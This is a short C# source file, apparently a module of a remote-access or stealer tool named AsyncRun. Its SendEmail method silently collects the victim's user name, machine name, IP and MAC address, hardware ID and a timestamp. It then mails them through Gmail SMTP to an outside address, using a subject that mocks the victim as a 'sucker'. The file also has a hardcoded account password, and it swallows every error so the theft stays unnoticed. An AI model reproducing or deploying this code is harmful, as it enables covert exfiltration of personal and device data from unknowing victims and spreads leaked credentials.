using System;
using System.Net.Mail;

namespace AsyncRun
{
    public class Mail
    {
        public static void SendEmail()
        {
            try
            {
                Personal Personal = new Personal();
                //ASSUNTO
                string ASSUNTO = $" || Iniciado na Maquina: " + Environment.UserName +
                 $"\n || NOME GERAL DO PC: " + Environment.MachineName +
                 $"\n || IP: " + Personal.IP +
                 $"\n || MAC: " + Personal.Mac +
                 $"\n || HWID: " + Personal.HardWarePC +
                 $"\n || DATA: " + DateTime.Now.ToString("[dd/MM/yy HH:mm:ss]") + "";



                MailMessage mail = new MailMessage
                {
                    From = new MailAddress("JoaoAndBola@gmail.com") // QUEM ENVIA
                };
                mail.To.Add(new MailAddress("AzurePb2018@gmail.com"));// DESTINO
                mail.Subject = "DADOS PESSOAL DO OTARIO!";
                mail.Body = ASSUNTO;//ASSUNTO


                SmtpClient send = new SmtpClient("smtp.gmail.com")
                {
                    Port = 587, // PORTA
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    EnableSsl = true,
                    Credentials = new System.Net.NetworkCredential("JoaoAndBola@gmail.com", "92403944") //CONTA
                }; // smtp do gmail
                send.Send(mail); //enviar mail
            }
            catch (Exception ex)
            {
                ex.ToString();
            }
        }

    }
}
